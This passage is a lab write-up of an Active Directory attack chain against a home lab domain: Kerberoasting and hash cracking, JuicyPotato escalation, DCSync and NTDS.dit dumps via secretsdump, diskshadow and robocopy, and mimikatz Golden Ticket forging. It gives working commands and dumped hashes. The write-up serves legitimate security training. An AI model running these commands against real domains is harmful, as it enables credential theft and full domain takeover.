$krb5tgs$23$*sromero$PAIF.LOCAL$paif.local/sromero*$f54472d9a96643e4144597530405dc04$7d0382667608964712b399fce1116e3ca7ede3d41f0dbccf36fa4f8c8bafc8fe54aa7456e11db3b52131f2126946d232f07649e9bc43b9cf799b66953d0acdeef25e7e635e342333c0cf18c92dc18b17c2596e3d7e1343705611ad7dea7c4ce2b32bc0b2985616bc0b46dd912ed4da776935295c513db827282989146f6ab008c4f1373d8294600a6b3da72e99660ed650ff8c9081f84544d895ac47781d5d07855bf3b826750169fde69cb2dc8e409aec2552b4f9c20f0082a9ccefa5a77fd8957d9abf5f974853337acb09d010a556fd8d1f0d27b108b28e7e194de85a9b2aa3e5cc5108551cb449ee1794c1f7595b14c290dca565b5cd3cff359e0e2f329808f665ada0a2907fb2e9fe20848c785f8aff962c98981e9a34aa5ef53000e5e85ac176084f255e7036aee475765af41bfa934724508a24ad8d3b52ceef612c390ea4cc680f8bdf2e8c067505194dbacb7a94e6e5b6b22f2f8843c6ec773a627dd80c9288f747dcbd33d526df9d9f5e903a566307c4cfd4e45fbeb991a2625e29e8dc53e069cb8821e464c56e920990b4d049449abdf4cd69fb24793840c9a298df6ad3bb677400599656ac71da412f01bcadc253f9328938479fc544c6b852a65306173206b0d05a38dfac2ab2854131f68b7158ca1f418a8c8d19a1903c335bdb9d4cc1a3e9dabe07f29cfb39277cff3b70d3cbf438d874d80237a16773d1a607d618421d13fc15528393f79019457f8b363f3935d745ebc137aee0e6a1e73b361819e3da326a132f41dd959b989ab32f08cdcfcf7a487b9ebfda9ac9a1e05e9f4b8bf3f39b5cc377f3f2ed1b9f73be6ad3e395879e608d27887d37ff79dd34902ce87a2d76347358f4bf8ef6303c63c00eda1c26be1eafe35903c362f1067f9b5039c8ad7b0c9186c270d110dd167203be5e517ffdfaf0eda6ce078531e1670e6090ae5be2b6adf790a9cd9f12c303a1c505f4339d09c3567f40f09d173edc81eac455b238da4bdec4c6497ed3b80ac2cc9385b5540de1bd03235e9593e49afa25e493fea77e6742d783a7ca2a566c292c80c8a72f7f868de197eab7c835b7b7ccd690a06b5014c45ea688ec523539da946f5240b6552d892e94bba2c6c7df93f10c8b0b8d539def4a1eeb553c63b5c3d937aa0777729fc2e2c1138cfd87580a5b00069a531947f7523d4ee4444c472ebb5e2600489ef5a5c7c33aaafd2e5aa86c6ef817693cd1492decd843ca86d4b9acb34a23a04a8f792335c3ad760a6fd4d0ee4c197cee57b1d86f1f77d9142a68331bc6584ba6a9324c6a59ed75a73181493e32f8a149abff2881515fe5a656a169da920d103b1c884ec74a59479b2d3b45d1578f0b91dc3547121521a53ab64d7d67f6416a572a231f0cbed8c440e7ef5700c66d55fe6a564249983df041f4b03cee7b340718eaf6a8538b1bf8ff4d0e06d86a6329021cf8b00202ec607579cfb0
$krb5tgs$23$*vcano$PAIF.LOCAL$paif.local/vcano*$d7d4999dd49bba5b1be43e8af7dae4a0$b0d868749d978500d04ae18719b9c14d82c115678367699ae6e55a495966706411306025643e1f2478b815160cbc034bc21e4d602d98a8c8ab9789b2b987c3611340f5e7a560f1486a1f980c307f8b7bdaa22839f0ec838180796fde21e278195359fdbe61b5e5168f1e6b6d78aa73939fa57901d5fde93286241cde28e13fb3f2f5e2baf0c8f87da9e98df22736580ea35cf9f6fb3e98b3fe95c9598554c1a3fd9a26514bd7d3caf90009debb7513fc7ac47342df15ced2c909e4be70837a60485832414589fb5fd1cbe35fdd69abb3bb8772cbd193f7b48d857cc34c80b26cb503f845b5a186edb3a77c38072f3dbab873e8e33f6053d040d9f49ea943810dfc76102fdb09e2649c729bb9b4da3e581a4501286c399da2a458d41f977ff539a262e0d09e4a693307c38daae5d6432844f525cb40eff099c2c6a858ce36860a6d9ca8f84a0fe49ba11494364b68dde89043908e7ba5484210d8c7db484d4ba350003bf6aff53f18dfbbf8124d9cc79974c1c0638d47f697c1712640aa7f647c2402ff27a760d364db1b99623eaa210c064cc18744df63b5eb63a7af383f511c95f04b1f2a2b9c20c9241c742ad3631f8a6ef98b5aa44e40e1a2b73ccefd478ff513a175de0348397897854d651f79af40b59b3a18156876bd58323b7a9156fc99eb05b2acd156fe501891f9f34056b3af329384d98907ba1fbe21a6ea8f7234964d8719fdb233b9240960d7e8dec834c4b5abebd3b56c524f57f3eea97bf3067bf3416f485d55a3dd2d9334e0374570db164de147b443f851df3e6ef44d11b7a9dba416c97b9012dfbedacf914e7e7714e17a14e5300e443afff4da4be7c3c4bb6defca8c5a0862cc0248de25b611be3cb639f4318dd5c1d89578e43e591575f4a88c247049139b604040c126790072d9dd36367259cd3f3ff890fc21d94f979dcef28ac67dcceb8799115caae252d23fc275e95ca40f8fd903d9c5b4a39ec63a1d846bfe1597df41f24753fb56afcacab8b94595b42bf1fbd54c574422ebccf8adc4378daa6f2f5fca478f1daa4bd466890b406cd2f046136e1c2c54819ac93a2c1fac39d70ef01e01c75d3e565e7c2fb1431e7e46c75e2e02c68c72bcd698c35ec6c34592f1ecbd115a4d8702c2de6b7a2f0439e14d7ddd174848da02c46689c9c76576581ba938bef84c7a21ff065c42baac12cf44170a5287b27e6108a593442bbedc88a6d058e21eab92faede5a8599b5d38a8e6660a245ae95e33501956c9edc5e543b20910286ddfa70bd0ae052bbfabf3dedb0ee57a575806489ec2cf07363fbf6c43b30ff2cff8390833ccbe3b125c451dad747bcc3ce8561224431b69f1264c02e7f652e61628a96cf10a651b5f45ac94643e4a83eb36e949abe4c579053b37239cd438369bae0215b2b9a37a7b36591c83d2c9c8106b13c95c7629e56ead4e5384805eee5255c1569682daf4
```

Here we can see that users **vcano** and **sromero** has an **SPN**. If these passwords are weak, the password will be successfully cracked with `john` or `hashcat`:

```zsh
❯ john -w:/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 2 password hashes with 2 different salts (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (sromero)     
Password2        (vcano)     
2g 0:00:00:00 DONE (2023-06-12 19:36) 28.57g/s 775314p/s 833828c/s 833828C/s soydivina..250984
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Nice! Here we can see that **both** passwords are weak (really weak xD), so we've been able to crack them. There is another way to get **sromero's** password, but I'll show it when we pwn **SROMERO-PC**.
This attack was successful because the users **sromero** and **vcano** (as I said before) have an **SPN** assigned to their account:

![](/assets/img/OSCP/10.png)

What this command does is to assing a **SNP** to the named user.

## Privilege escalation
---

### SeImpersonatePrivilege
---

By connecting to the **Domain Controller** as **vcano** we can see that we have a really interesting privilege:

![](/assets/img/OSCP/11.png)

To escalate this privilege is pretty simple. We just need to use the tool [JuicyPotato](https://github.com/ohpe/juicy-potato) and, in this case, `netcat`:

![](/assets/img/OSCP/12.png)

Nice! So we are **nt authority\system** on the **Domain Controller**! But you may wander how this privilege works. The **SeImpersonatePrivilege** is a security privilege. This privilege allows a user to impersonate or act on behalf of another user or security context after successful authentication. What `JuicyPotato` does is the following:

- First, it tricks the **NT AUTHORITY\SYSTEM** account to authenticate via **NTLM** to a **TCP** endpoint that we control. This endpoint is the one that `JuicyPotato` creates so it can perform the next actions.
- After the **NT AUTHORITY\SYSTEM** is successfully cheated to authenticate into our **TCP** enpoint, **MITM** (Man-In-The-Middle) attempts to locally negotiate a security **token** for the **NT AUTHORITY\SYSTEM** account. This is done through a series of **Windows API calls**, by interacting with **LSASS**.
- When that is performed, it impersonates the **token** negociated, giving us the capability to execute the program we've indicated on the command.

> If you want to learn in detail how this attack works, I fully recommend you to read [this article](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/).
{: .prompt-tip }

**vcano** has this privilege because the **Local Security Policies** are setted up like this:

![](/assets/img/OSCP/14.png)

If you want to protect your **Domain Controller** from this attack, just don't add any user to that privilege.

### SecretsDump
---

By listing the files on **vcano's** home folder, we can see an interesting foder called **E-Mails**:

![](/assets/img/OSCP/13.png)

We can see a file **msg-XXX-XXX-XXX.txt**, that seems an e-mail conversation between the **Administrator** user and the **vcano** user:

![](/assets/img/OSCP/15.png)

We can see that is talking about a **backup** user with the password **Password4**. It is also saying that it's a backup of the **Administrator** user! Well, with this info we can know how to privilege escalate right? We can use `secretsdump.py`, as we did in **Attacktive Directory** machine:

```zsh
❯ impacket-secretsdump paif.local/backup:Password4@192.168.0.107
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0x007057c042f580164882e26e02c98e27
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
paif\DC-COMPANY$:aes256-cts-hmac-sha1-96:538f7e0b78bec074a7a6bf83775758966aba47ed5042b0bcce47a3d26dc390a3
paif\DC-COMPANY$:aes128-cts-hmac-sha1-96:e24aa96f20ce57a1210f4ea74618c81d
paif\DC-COMPANY$:des-cbc-md5:e5fe8c7a640b2fa1
paif\DC-COMPANY$:plain_password_hex:7869dff30a636a915062991b06238a62bad00a2b3888777bff24d58460f3e2376ced60566a239715fa37831ad539d317d359933acf0ebc583f65b05e27ccec46c53ba1477da5c122b1ad71315a201de19d5f032faee4c537e90133262261c4bd602a138dbb896158eb3e5b1b57fece6bb6f7e8fede3216ddc3cc12750edebbd156cf9a7710917a60e8a50bfc1024dcc0491171df741f24599dc6917ed8ebc571d33bfd23c268c37afb11c452ff03201c40e6b51ed7b8c039f8bf4e65dc46da11ebf7b793def4db7958450572a51a0c5acf05b70780749d1cfd8a3b6d35af7be152ba669d21e99e8955fbc3f6677253bf
paif\DC-COMPANY$:aad3b435b51404eeaad3b435b51404ee:35b699968e1ba8f4b6415a081ed032de:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x5a160142683dad8cf0fe6db6e64b554c72ac7bcf
dpapi_userkey:0x47fe293edda230de753b4373b38d0499b28fcf6f
[*] NL$KM 
 0000   E0 A2 78 64 6F 32 98 6B  46 12 03 06 58 51 3C E3   ..xdo2.kF...XQ<.
 0010   8B 36 61 74 A0 1A E4 6E  AD 38 44 1F 17 A5 4A 83   .6at...n.8D...J.
 0020   B8 E7 5C 79 7F 94 7D 54  4E BB EA D8 60 72 C2 F5   ..\y..}TN...`r..
 0030   B2 63 C2 3A 23 5D A8 95  6A C6 74 F2 D7 22 A5 6E   .c.:#]..j.t..".n
NL$KM:e0a278646f32986b4612030658513ce38b366174a01ae46ead38441f17a54a83b8e75c797f947d544ebbead86072c2f5b263c23a235da8956ac674f2d722a56e
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c96fa8a3ae9ca43564d5453a27e7f18:::
paif.local\sromero:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
vcano:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
paif.local\backup:1126:aad3b435b51404eeaad3b435b51404ee:7247e8d4387e76996ff3f18a34316fdd:::
paif.local\svc_sql:1128:aad3b435b51404eeaad3b435b51404ee:32857b512d72905dcbc0239bdae6d8cd:::
DC-COMPANY$:1000:aad3b435b51404eeaad3b435b51404ee:35b699968e1ba8f4b6415a081ed032de:::
SROMERO-PC$:1106:aad3b435b51404eeaad3b435b51404ee:6dad0809608ac6a13b8b14678630bf68:::
VCANO-PC$:1107:aad3b435b51404eeaad3b435b51404ee:1390cd36af106a5964bdd41aee6582a7:::
dsimion-VirtualBox$:1110:aad3b435b51404eeaad3b435b51404ee:452008842603c3792b4b63647cae29da:::
CCRESPO-PC$:1115:aad3b435b51404eeaad3b435b51404ee:7b177481f9e9667ea447b8e12d4dcbc6:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:126d0a7c4bad3d727a33dab58949b6b9392df48bae57ce96280642feb87a28e8
Administrator:aes128-cts-hmac-sha1-96:36785d96b1fbfee884c67d49483eeb73
Administrator:des-cbc-md5:9ee3510ea82a9d37
krbtgt:aes256-cts-hmac-sha1-96:7097ae9ce677b0daf8a4b4cb424b57acbe3b0cdb625e8610f0d25913d053bb4a
krbtgt:aes128-cts-hmac-sha1-96:31cf92fa1106e530af70f5c5c8b27e79
krbtgt:des-cbc-md5:258f3da46b089bfb
paif.local\sromero:aes256-cts-hmac-sha1-96:7ea3cea37429913923bfd10fc420263399d0ad5897d81382a9ed6b64a62e1463
paif.local\sromero:aes128-cts-hmac-sha1-96:e92a68ed75cf51ff7d1362c901314e6d
paif.local\sromero:des-cbc-md5:9d8a89dfdcd56dd0
vcano:aes256-cts-hmac-sha1-96:e922989617cf18b4b678da16046942c11dc5bbba1fbf33387eba00115e6c9e51
vcano:aes128-cts-hmac-sha1-96:2d34ca2d46e40f8e521bf44d1a0291b4
vcano:des-cbc-md5:1af73bd564cdea91
paif.local\backup:aes256-cts-hmac-sha1-96:a6bb9cfbddccf97e517f06d3fb88005401e5c35a402f5a91b174892e410371f8
paif.local\backup:aes128-cts-hmac-sha1-96:05cd894ab4475d9a41f086ca8070c44b
paif.local\backup:des-cbc-md5:94cd6b75e0f276c2
paif.local\svc_sql:aes256-cts-hmac-sha1-96:3337600ad2ab8395e9275000a30f11e67562fe1ce9dde1e2db4a9457df0517f7
paif.local\svc_sql:aes128-cts-hmac-sha1-96:8be71333aee329def0574bb7bcedf679
paif.local\svc_sql:des-cbc-md5:fb10891c25ade9d0
DC-COMPANY$:aes256-cts-hmac-sha1-96:538f7e0b78bec074a7a6bf83775758966aba47ed5042b0bcce47a3d26dc390a3
DC-COMPANY$:aes128-cts-hmac-sha1-96:e24aa96f20ce57a1210f4ea74618c81d
DC-COMPANY$:des-cbc-md5:5ee6ab343e2c0734
SROMERO-PC$:aes256-cts-hmac-sha1-96:535e66ceeaf71dd29144387af7da0b6f4f8b9007aa4d45c476c93e564bcc5912
SROMERO-PC$:aes128-cts-hmac-sha1-96:cbb50a1a095ece8e0bf75b05d0f06812
SROMERO-PC$:des-cbc-md5:9452863b2f89fe23
VCANO-PC$:aes256-cts-hmac-sha1-96:4357b2cb9122a5afcd360ccdb1c649c75d662d35b30dda54c1b771f6e3bbecb3
VCANO-PC$:aes128-cts-hmac-sha1-96:da76e1d3491e31b844a22efe4caaabc3
VCANO-PC$:des-cbc-md5:b63b3e5b9143913d
dsimion-VirtualBox$:aes256-cts-hmac-sha1-96:91ca2e809b9fb385c64d370078fb443c3072001b04890fc038f74f677eb614e4
dsimion-VirtualBox$:aes128-cts-hmac-sha1-96:1d3a76dfeaf9767dccd514ba7675a719
dsimion-VirtualBox$:des-cbc-md5:7f6726e632d09b7f
CCRESPO-PC$:aes256-cts-hmac-sha1-96:7356fed5485c3ea819078b3c30a726e337a01b0a2b75a947a8e4ff5e2b578adc
CCRESPO-PC$:aes128-cts-hmac-sha1-96:0cb4cd0b2fa5b864fa266aa5bac7fa1e
CCRESPO-PC$:des-cbc-md5:abec981f73e3e502
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

Great! It basically gives us **all** the hashes of **all** computers connected to the **Domain Controller** because this is an Administrator's backup. This is being successful because this user (**backup**) has direct **DCSync** rights to the **Domain Controller**:

![](/assets/img/OSCP/16.png)

Ok, so with those hash in our possession, we can connect to the **Domain Controller** as **Administrator**:

![](/assets/img/OSCP/17.png)

How it works `secretsdump`? Well, when you provide to it credentials, it will dump the **NTDS.dit** over all the computers in which belongs to **Administrators** group. For example, if we've inputed the **sromero** credentials, we would obtain the **NTDS.dit** of the **VCANO-PC**, because in that computer, **sromero** has **Administrator** privileges.

### SeBackupPrivilege
---

Let's change the user. Now we are going to login as **sromero**, and we'll see again, an interesting privilege:

![](/assets/img/OSCP/18.png)

What this privilege allows us is to make backups of the system files as **Administrator**. We can take advantage of that to for example, backup the **sam** of the **Domain Controller** to later connect as **Administrator**:

```zsh
reg save hklm\sam c:\Temp\sam
reg save hklm\system c:\Temp\system
```

![](/assets/img/OSCP/19.png)

What these two commands do is to save the **Domain Controller's** **sam** into `C:\Temp` (a directory that we've created):

![](/assets/img/OSCP/20.png)

And it will also save the **system** registry:

![](/assets/img/OSCP/21.png)

Now we could transfer those two files into our attacker machine. You can do that with the `evil-winrm` utility: `download` or by creating a `SMB` server in our attacker machine and copying those files into it.

![](/assets/img/OSCP/22.png)

![](/assets/img/OSCP/23.png)

Perfect! Now, we are going to use the tool `pypykatz` (a variant of `mimikatz` coded in python) in its **registry** mode and use the `--sam` parameter to dump all the **NTLM** hashes of the **Domain Controller**:

```zsh
❯ pypykatz registry --sam sam system
WARNING:pypykatz:SECURITY hive path not supplied! Parsing SECURITY will not work
WARNING:pypykatz:SOFTWARE hive path not supplied! Parsing SOFTWARE will not work
============== SYSTEM hive secrets ==============
CurrentControlSet: ControlSet001
Boot Key: 007057c042f580164882e26e02c98e27
============== SAM hive secrets ==============
HBoot Key: dfa4f1a803b9eda755bebb8295db841c10101010101010101010101010101010
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
``` 

And perfect! We've been able to dump the **sam** of the **Domain Controller**!
In order to this attack can be performed the **Domain Controller** must be setted up in the following way:

- First, create a new user:

![](/assets/img/OSCP/24.png)

- Then add it to the **Backup Operators** group:

![](/assets/img/OSCP/25.png)

![](/assets/img/OSCP/26.png)

- Now add the new user to the **Remote Management Users** group:

![](/assets/img/OSCP/28.png)

Now if we test this privilege, we can see that is successfully added:

![](/assets/img/OSCP/29.png)

Now, with this user, I am going to show you a second method just because there are times that we can't copy the **sam** or the **system** because they are being in use, so we need to do it in other ways. For example, now we are not going to use **sam** and **system**, instead we are going to dump the **ntds.dit**. This file is **always** being executed on the **Domain Controller**, so as I said before, we can't copy it as we did in the last method. You may wander, **"Hey Ruycr4ft, if we can't copy the files with the regular way, how are we going to do it?"** Well, is pretty simple! We are going to use the `diskshadow` functionality. This is a built-in function on Windows systems that can help us to create a copy of a drive thas is currently in use. To go to the simplest way to do this, we are going to create a **Distributed Shell File** `.dsh`, that will consist on the required commands of `diskshadow`. These commands consist on creating a copy of the dirve **C** into a **Z** drive, in which we will later able to read `ntds.dit` because this is not being used.

```zsh
set context persistent nowriters
add volume c: alias ruy
create
expose %ruy% z:
unix2dos ruy.dsh
```

Save this file into `ruy.dsh`. When it is created, we need to use `unix2dos` to convert the encoding and spacing of the `dsh` file so its compatible with the **Windows** machine:

```zsh
❯ unix2dos ruy.dsh
unix2dos: convirtiendo archivo ruy.dsh a formato DOS...
```

Now we can connect to the machine and upload the `dsh` file so we later can execute `diskshadow`:

![](/assets/img/OSCP/30.png)

```zsh
*Evil-WinRM* PS C:\Temp> diskshadow /s ruy.dsh
Microsoft DiskShadow version 1.0
Copyright (C) 2013 Microsoft Corporation
On computer:  DC-COMPANY,  6/12/2023 12:13:34 PM

-> set context persistent nowriters
-> add volume c: alias temp
-> create
Alias temp for shadow ID {84f99236-842a-442e-b76f-95e517885e58} set as environment variable.
Alias VSS_SHADOW_SET for shadow set ID {009b13ae-45fe-4c40-8129-a7005798dd2f} set as environment variable.

Querying all shadow copies with the shadow copy set ID {009b13ae-45fe-4c40-8129-a7005798dd2f}

	* Shadow copy ID = {84f99236-842a-442e-b76f-95e517885e58}		%temp%
		- Shadow copy set: {009b13ae-45fe-4c40-8129-a7005798dd2f}	%VSS_SHADOW_SET%
		- Original count of shadow copies = 1
		- Original volume name: \\?\Volume{5adb38b8-0000-0000-0000-602200000000}\ [C:\]
		- Creation time: 6/12/2023 12:13:34 PM
		- Shadow copy device name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy5
		- Originating machine: DC-Company.paif.local
		- Service machine: DC-Company.paif.local
		- Not exposed
		- Provider ID: {b5946137-7b9f-4925-af80-51abd60b20d5}
		- Attributes:  No_Auto_Release Persistent No_Writers Differential

Number of shadow copies listed: 1
-> expose %temp% f:
-> %temp% = {84f99236-842a-442e-b76f-95e517885e58}
The shadow copy was successfully exposed as f:\.
->
*Evil-WinRM* PS C:\Temp> robocopy /b f:\windows\ntds . ntds.dit

-------------------------------------------------------------------------------
   ROBOCOPY     ::     Robust File Copy for Windows
-------------------------------------------------------------------------------

  Started : Monday, June 12, 2023 12:13:48 PM
   Source : f:\windows\ntds\
     Dest : C:\Temp\

    Files : ntds.dit

  Options : /DCOPY:DA /COPY:DAT /B /R:1000000 /W:30

------------------------------------------------------------------------------

	                  1	f:\windows\ntds\
	   New File  		 16.0 m	ntds.dit

------------------------------------------------------------------------------

               Total    Copied   Skipped  Mismatch    FAILED    Extras
    Dirs :         1         0         1         0         0         0
   Files :         1         1         0         0         0         0
   Bytes :   16.00 m   16.00 m         0         0         0         0
   Times :   0:00:00   0:00:00                       0:00:00   0:00:00


   Speed :           118987347 Bytes/sec.
   Speed :            6808.510 MegaBytes/min.
   Ended : Monday, June 12, 2023 12:13:48 PM
```

We are now in the possession of the **ntds.dit** file and we need to extract the system hive. This can be done with a simple `reg` save command:

![](/assets/img/OSCP/31.png)

Great! As we can see here, we've successfully extracted the **ntds.dit** file!

![](/assets/img/OSCP/32.png)

![](/assets/img/OSCP/33.png)

Now we could use again `secretsdump` to extract the **NTLM** hashes from the **ntds.dit** file:

```zsh
❯ impacket-secretsdump -ntds ntds.dit -system system local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Target system bootKey: 0x007057c042f580164882e26e02c98e27
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Searching for pekList, be patient
[*] PEK # 0 found and decrypted: 60737e4d62af345cba673f64903115a0
[*] Reading and decrypting hashes from ntds.dit 
Administrator:500:aad3b435b51404eeaad3b435b51404ee:920ae267e048417fcfe00f49ecbd4b33:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DC-COMPANY$:1000:aad3b435b51404eeaad3b435b51404ee:35b699968e1ba8f4b6415a081ed032de:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7c96fa8a3ae9ca43564d5453a27e7f18:::
paif.local\sromero:1103:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
vcano:1104:aad3b435b51404eeaad3b435b51404ee:c39f2beb3d2ec06a62cb887fb391dee0:::
SROMERO-PC$:1106:aad3b435b51404eeaad3b435b51404ee:6dad0809608ac6a13b8b14678630bf68:::
dsimion-VirtualBox$:1110:aad3b435b51404eeaad3b435b51404ee:452008842603c3792b4b63647cae29da:::
CCRESPO-PC$:1115:aad3b435b51404eeaad3b435b51404ee:7b177481f9e9667ea447b8e12d4dcbc6:::
paif.local\svc_sql:1117:aad3b435b51404eeaad3b435b51404ee:32857b512d72905dcbc0239bdae6d8cd:::
[*] Kerberos keys from ntds.dit 
Administrator:aes256-cts-hmac-sha1-96:126d0a7c4bad3d727a33dab58949b6b9392df48bae57ce96280642feb87a28e8
Administrator:aes128-cts-hmac-sha1-96:36785d96b1fbfee884c67d49483eeb73
Administrator:des-cbc-md5:9ee3510ea82a9d37
DC-COMPANY$:aes256-cts-hmac-sha1-96:538f7e0b78bec074a7a6bf83775758966aba47ed5042b0bcce47a3d26dc390a3
DC-COMPANY$:aes128-cts-hmac-sha1-96:e24aa96f20ce57a1210f4ea74618c81d
DC-COMPANY$:des-cbc-md5:5ee6ab343e2c0734
krbtgt:aes256-cts-hmac-sha1-96:7097ae9ce677b0daf8a4b4cb424b57acbe3b0cdb625e8610f0d25913d053bb4a
krbtgt:aes128-cts-hmac-sha1-96:31cf92fa1106e530af70f5c5c8b27e79
krbtgt:des-cbc-md5:258f3da46b089bfb
paif.local\sromero:aes256-cts-hmac-sha1-96:7ea3cea37429913923bfd10fc420263399d0ad5897d81382a9ed6b64a62e1463
paif.local\sromero:aes128-cts-hmac-sha1-96:e92a68ed75cf51ff7d1362c901314e6d
paif.local\sromero:des-cbc-md5:9d8a89dfdcd56dd0
vcano:aes256-cts-hmac-sha1-96:e922989617cf18b4b678da16046942c11dc5bbba1fbf33387eba00115e6c9e51
vcano:aes128-cts-hmac-sha1-96:2d34ca2d46e40f8e521bf44d1a0291b4
vcano:des-cbc-md5:1af73bd564cdea91
SROMERO-PC$:aes256-cts-hmac-sha1-96:535e66ceeaf71dd29144387af7da0b6f4f8b9007aa4d45c476c93e564bcc5912
SROMERO-PC$:aes128-cts-hmac-sha1-96:cbb50a1a095ece8e0bf75b05d0f06812
SROMERO-PC$:des-cbc-md5:9452863b2f89fe23
dsimion-VirtualBox$:aes256-cts-hmac-sha1-96:91ca2e809b9fb385c64d370078fb443c3072001b04890fc038f74f677eb614e4
dsimion-VirtualBox$:aes128-cts-hmac-sha1-96:1d3a76dfeaf9767dccd514ba7675a719
dsimion-VirtualBox$:des-cbc-md5:7f6726e632d09b7f
CCRESPO-PC$:aes256-cts-hmac-sha1-96:7356fed5485c3ea819078b3c30a726e337a01b0a2b75a947a8e4ff5e2b578adc
CCRESPO-PC$:aes128-cts-hmac-sha1-96:0cb4cd0b2fa5b864fa266aa5bac7fa1e
CCRESPO-PC$:des-cbc-md5:abec981f73e3e502
paif.local\svc_sql:aes256-cts-hmac-sha1-96:3337600ad2ab8395e9275000a30f11e67562fe1ce9dde1e2db4a9457df0517f7
paif.local\svc_sql:aes128-cts-hmac-sha1-96:8be71333aee329def0574bb7bcedf679
paif.local\svc_sql:des-cbc-md5:fb10891c25ade9d0
[*] Cleaning up... 
```

Nice! We've extracted (again) the Administrator's hash!


### Golden Ticket
---

![](/assets/img/OSCP/46.png)

---

For this kind of attack, we would need to exploit the **Kerberos ticket authentication system**, which is commonly used in corporate network environments. We would create a fake ticket with an extremely long validity period, known as **Golden Ticket**. To generate this forged ticket, we would require access to the domain account’s encryption key, also referred to as the **domain account master key** or **domain encryption key**. This key can be obtained by compromising the **Domain Controller** and extracting it from the system's memory.

Once we have successfully created the **Golden Ticket**, we can use it to authenticate ourselves within the **Kerberos system** without the need for genuine user credentials. This attack would grant us full access and administrator privileges on the compromised network.

#### Method 1
---

For this method we'll use `kirbi` file. What we are bassically going to do, is to create a **TGT** (Ticket Grangin Ticket) with the **NTLM** hash of the **krgtgt** account. The advantage of using a **TGT** instead of a **TGS** is that we can access **any machine** as the impersonated user in the **Domain Controller**. For this method, we'll use a tool kalled `mimikatz`, which we've used it in my **Active Directory** notes. 
First, we are going to connect to the **Domain Controller** as the **sromero** user. After that, we must upload the `mimikatz` binary to the machine. We are now going to use the `.exe` file, but I will later show how to do it if the **Anti-Virus** is activated (spoiler: we'll need to de-encode the binary in memory).

- As I said, we first need to connect to the **Domain Controller** and upload the `mimikatz` tool:

![](/assets/img/OSCP/34.png)

- Now we can run `mimikatz` and execute the following command: `lsadump::lsa /inject /name:krbtgt`

![](/assets/img/OSCP/35.png)

What this command does is to show all the information about the built-in account **krbtgt**, such as its **NTLM** hash, its **SID**, and more. Because we need to use some of this info later, let's save the output in a file.
- After that, we must input the following command: `kerberos::golden /domain:paif.local /sid:S-1-5-21-2575778808-3512245514-2536450312 /rc4:7c96fa8a3ae9ca43564d5453a27e7f18 /user:Administrator /ticket:golden.kirbi`:

![](/assets/img/OSCP/36.png)

What this command does is, with the **krbtgt** account's **SID** and **NTLM** hash, it creates a `.kirbi` file, which is impersonated by the **Administrator** user, in this case. If everything went well (as it seems in the output), we should obtain the `golden.kirbi` file:

![](/assets/img/OSCP/37.png)

Now we need to transfer that file into our attacker machine. We can do this in various ways, but I am going to use the one I've always used in this lab; copying it into our **SMB** server. You can do this in other ways, but I think this is the most confortable one.

![](/assets/img/OSCP/38.png)

Because the user **sromero** has **Administrator** privileges over the **vcano** user...

![](/assets/img/OSCP/42.png)

...we could apply this attack to the **vcano** user. If we connect to the **Domain Controller** as **vcano**, and then try to list the **C$** share, we will notice that we **don't have permissions**:

![](/assets/img/OSCP/43.png)

What we are going to achive with this method, is to read that share.

> This would also work if we connect to the **VCANO-PC**, because **sromero** has **Administrator** privileges over it, we'll try it later.
{: .prompt-tip }

Now what we would need to do, is to get the `golden.kirbi` file we've just created into the current working directory. This time we are going to take advantage of the `upload` function of `evil-winrm`. Its just as simple as `upload golden.kirbi`. Now, I had some trouble with `mimikatz` on `evil-winrm`, so let's also upload `netcat` and send us a powershell so `mimikatz` can work properly. 
Now we need to run `mimikatz` and execute the following command: `kerberos::ptt golden.kirbi`:

![](/assets/img/OSCP/44.png)

Now, remember that when we've tried to list the share **C$** we had permission denied?

